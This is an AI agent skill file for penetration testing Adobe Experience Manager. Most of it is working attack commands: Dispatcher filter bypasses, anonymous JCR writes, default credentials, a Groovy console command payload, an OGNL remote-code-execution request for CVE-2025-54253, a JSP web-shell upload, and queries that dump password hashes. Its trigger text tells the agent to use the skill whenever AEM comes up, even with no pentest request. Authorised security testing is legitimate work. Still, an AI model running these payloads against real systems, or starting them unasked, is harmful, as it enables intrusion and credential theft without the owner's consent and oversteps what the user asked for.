---
name: aem-pentest
description: Pentest Adobe Experience Manager (AEM) instances. Use this skill whenever the user mentions AEM, Adobe Experience Manager, Adobe Experience Cloud, Sling, OSGi, JCR, or needs to assess AEM security. Trigger for AEM fingerprinting, vulnerability scanning, exploitation, CVE checking, or any AEM-related security assessment. Don't wait for explicit "pentest" requests - if they're working with AEM infrastructure, use this skill.
---

# AEM (Adobe Experience Manager) Pentesting

This skill guides you through pentesting Adobe Experience Manager (AEM) instances. AEM is an enterprise CMS running on Apache Sling/Felix (OSGi) with a Java Content Repository (JCR). From an attacker perspective, AEM instances often expose dangerous development endpoints, weak Dispatcher rules, default credentials, and CVEs patched quarterly.

## Quick Start

1. **Fingerprint** the target to confirm AEM
2. **Scan** for high-value unauthenticated endpoints
3. **Test** for common misconfigurations
4. **Check** for known CVEs based on version
5. **Exploit** if vulnerabilities are found

---

## 1. Fingerprinting

Confirm the target is running AEM before proceeding.

### Check HTTP headers
```bash
curl -s -I https://target | egrep -i "aem|sling|cq|dispatcher"
```

Look for:
- `X-Dispatcher: *` - Header added by AEM Dispatcher
- `X-Content-Type-Options: nosniff`

### Check static paths
```bash
curl -s https://target/etc.clientlibs/ | head -20
curl -s https://target/libs/granite/core/content/login.html | grep -i "adobe"
```

### Check HTML comments
```bash
curl -s https://target | grep -o '</script><!--/* CQ */-->'
```

**If you find any of these indicators, you're dealing with AEM.**

---

## 2. High-Value Unauthenticated Endpoints

Test these endpoints systematically. Many are blocked by default but Dispatcher bypasses often work.

| Path | What You Get | Notes |
|------|--------------|-------|
| `/.json`, `/.1.json` | JCR nodes via DefaultGetServlet | Often blocked, try bypasses |
| `/bin/querybuilder.json?path=/` | QueryBuilder API | Leaks page tree, internal paths, usernames |
| `/system/console/status-*` | OSGi/Felix console | 403 by default; if exposed + creds = RCE |
| `/crx/packmgr/index.jsp` | Package Manager | Authenticated content packages → JSP upload |
| `/etc/groovyconsole/**` | Groovy Console | If exposed → arbitrary Groovy/Java execution |
| `/libs/cq/AuditlogSearchServlet.json` | Audit logs | Information disclosure |
| `/libs/cq/ui/content/dumplibs.html` | ClientLibs dump | XSS vector |
| `/adminui/debug` | AEM Forms Struts dev-mode | CVE-2025-54253: unauth OGNL RCE |

### Dispatcher Bypass Techniques

Most production sites sit behind the Dispatcher (reverse-proxy). Filter rules are frequently bypassed.

**Semicolon + allowed extension:**
```bash
curl -s "https://target/bin/querybuilder.json;%0aa.css?path=/home&type=rep:User"
```

**Encoded slash bypass (2025 KB ka-27832):**
```bash
curl -s "https://target/%2fbin%2fquerybuilder.json?path=/etc&1_property=jcr:primaryType"
```

**Use the `aem-fingerprint.sh` script** to automate these checks.

---

## 3. Common Misconfigurations

Test for these issues that persist in 2026:

### 3.1 Anonymous POST Servlet
```bash
curl -s -X POST "https://target/.json" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d ":operation=import&jcr:primaryType=nt:file"
```

If successful, you can plant new JCR nodes.

### 3.2 World-Readable User Profiles
```bash
curl -s "https://target/home/users/*/profile/.1.json"
```

Default ACL grants `jcr:read` on `/home/users/**/profile/*` to everyone.

### 3.3 Default Credentials
Try these common defaults:
- `admin:admin`
- `author:author`
- `replication:replication`

### 3.4 WCMDebugFilter XSS
```bash
curl -s "https://target/?debug=layout" | grep -i "debug"
```

CVE-2016-7882 - still found on legacy 6.4 installs.

### 3.5 Groovy Console Exposure
```bash
curl -u admin:admin -d 'script=println "pwn".execute()' \
  "https://target/bin/groovyconsole/post.json"
```

### 3.6 AEM Forms Struts DevMode
```bash
curl -k "https://target:8443/adminui/debug?expression=%23cmd%3D%27whoami%27,%23p=new%20java.lang.ProcessBuilder(%23cmd).start()"
```

CVE-2025-54253 - unauthenticated OGNL RCE.

---

## 4. CVE Checking

Match the customer's service pack to known vulnerabilities:

| Quarter | CVE/Bulletin | Affected | Impact |
|---------|--------------|----------|--------|
| Dec 2025 | APSB25-115, CVE-2025-64537/64539 | 6.5.24 & earlier, Cloud 2025.12 | Critical/stored XSS → code execution |
| Sep 2025 | APSB25-90 | 6.5.23 & earlier | Security feature bypass chain |
| Aug 2025 | CVE-2025-54253/54254 | Forms 6.5.23.0 & earlier | DevMode OGNL RCE + XXE file read |
| Jun 2025 | APSB25-48 | 6.5.23 & earlier | Stored XSS, privilege escalation |
| Dec 2024 | APSB24-69 | 6.5.22 & earlier | DOM/Stored XSS, code exec |
| Dec 2023 | APSB23-72 | ≤ 6.5.18 | DOM-based XSS |

**Recommendation:** Push for latest **6.5.24 (Nov 26, 2025)** or **Cloud Service 2025.12**. AEM Forms on JEE needs hotfix **6.5.0-0108+**.

---

## 5. Exploitation

### 5.1 RCE via Dispatcher Bypass + JSP Upload

If anonymous write is possible:

```bash
# Create a node that becomes /content/evil.jsp
curl -X POST "https://target/content/evil.jsp;%0aa.css" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d ":contentType=text/plain&jcr:data=%3C%25%20out.println(\"pwned\");%25%3E&:operation=import"

# Execute the JSP
curl -s "https://target/content/evil.jsp"
```

### 5.2 SSRF to RCE (Historical < 6.3)

```bash
curl -s "https://target/libs/mcm/salesforce/customer.html;%0aa.css?checkType=authorize&authorization_url=http://127.0.0.1:4502/system/console"
```

Use `aem-hacker` tool to automate this chain.

### 5.3 OGNL RCE on AEM Forms JEE (CVE-2025-54253)

```bash
curl -k "https://target:8443/adminui/debug?expression=%23cmd%3D%27whoami%27,%23p=new%20java.lang.ProcessBuilder(%23cmd).start(),%23out=new%20java.io.InputStreamReader(%23p.getInputStream()),%23br=new%20java.io.BufferedReader(%23out),%23br.readLine()"
```

If vulnerable, the HTTP body contains command output.

### 5.4 QueryBuilder Hash Disclosure

```bash
curl -s "https://target/%2fbin%2fquerybuilder.json?path=/home&type=rep:User&p.hits=full&p.nodedepth=2&p.offset=0"
```

Returns user nodes including `rep:password` hashes when anonymous read ACLs are default.

---

## 6. Tooling

### aem-hacker
Swiss-army enumeration script supporting dispatcher bypass, SSRF detection, default-creds checks.

```bash
python3 aem_hacker.py -u https://target --host attacker-ip
```

### Tenable WAS Plugin 115065
Detects QueryBuilder hash disclosure & encoded-slash bypass automatically (published Dec 2025).

### Content Brute-Force
Recursively request `/_jcr_content.(json|html)` to discover hidden components.

### osgi-infect
Upload malicious OSGi bundle via `/system/console/bundles` if creds available.

---

## Workflow Summary

1. **Fingerprint** → Confirm AEM with headers, paths, comments
2. **Enumerate** → Test high-value endpoints with bypasses
3. **Check CVEs** → Match version to vulnerability database
4. **Test Misconfigs** → Default creds, exposed consoles, debug modes
5. **Exploit** → Use appropriate technique based on findings
6. **Report** → Document findings with CVE references and remediation

---

## References

- [Adobe Security Bulletin APSB25-115](https://helpx.adobe.com/security/products/experience-manager/apsb25-115.html)
- [BleepingComputer - AEM Forms Zero-Days](https://www.bleepingcomputer.com/news/security/adobe-issues-emergency-fixes-for-aem-forms-zero-days-after-pocs-released/)
- [aem-hacker GitHub](https://github.com/0x4D31/aem-hacker)
